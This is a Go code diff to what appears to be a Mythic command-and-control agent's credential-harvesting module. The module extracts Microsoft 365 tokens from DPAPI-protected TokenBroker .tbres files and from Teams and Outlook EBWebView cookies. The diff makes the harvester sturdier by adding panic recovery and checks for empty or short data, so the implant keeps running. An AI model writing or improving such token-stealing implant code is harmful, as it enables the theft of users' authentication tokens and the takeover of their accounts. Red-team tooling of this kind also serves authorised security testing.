@@ -18,7 +18,18 @@ import (
 // - TokenBroker cache (.tbres files) — DPAPI-protected token responses
 // - Teams EBWebView cookies — Chromium-pattern AES-GCM encrypted cookies
 // - Outlook (new) EBWebView cookies — same pattern
-func credM365Tokens(args credHarvestArgs) structs.CommandResult {
+func credM365Tokens(args credHarvestArgs) (result structs.CommandResult) {
+	// Recover from panics in DPAPI/SQLite/etc to prevent crashing the agent
+	defer func() {
+		if r := recover(); r != nil {
+			result = structs.CommandResult{
+				Output:    fmt.Sprintf("m365-tokens panic: %v", r),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+	}()
+
 	var sb strings.Builder
 	var allCreds []structs.MythicCredential
 
@@ -38,7 +49,7 @@ func credM365Tokens(args credHarvestArgs) structs.CommandResult {
 
 	sb.WriteString(fmt.Sprintf("\nTotal tokens extracted: %d\n", len(allCreds)))
 
-	result := structs.CommandResult{
+	result = structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
@@ -166,8 +177,8 @@ func parseTbresFile(path string) ([]extractedToken, error) {
 	}
 
 	decoded, err := base64.StdEncoding.DecodeString(respBytes.Value)
-	if err != nil {
-		return nil, fmt.Errorf("base64 decode: %w", err)
+	if err != nil || len(decoded) == 0 {
+		return nil, fmt.Errorf("base64 decode: empty or invalid")
 	}
 
 	if !respBytes.IsProtected {
@@ -175,12 +186,19 @@ func parseTbresFile(path string) ([]extractedToken, error) {
 		return parseTokenResponseJSON(decoded)
 	}
 
-	// DPAPI decrypt
+	// DPAPI decrypt — guard against empty/tiny data that would panic
+	if len(decoded) < 8 {
+		return nil, fmt.Errorf("DPAPI data too short (%d bytes)", len(decoded))
+	}
 	decrypted, err := dpapiDecrypt(decoded)
 	if err != nil {
 		return nil, fmt.Errorf("DPAPI: %w", err)
 	}
 	defer structs.ZeroBytes(decrypted)
+
+	if len(decrypted) == 0 {
+		return nil, nil
+	}
 
 	return parseTokenResponseJSON(decrypted)
 }
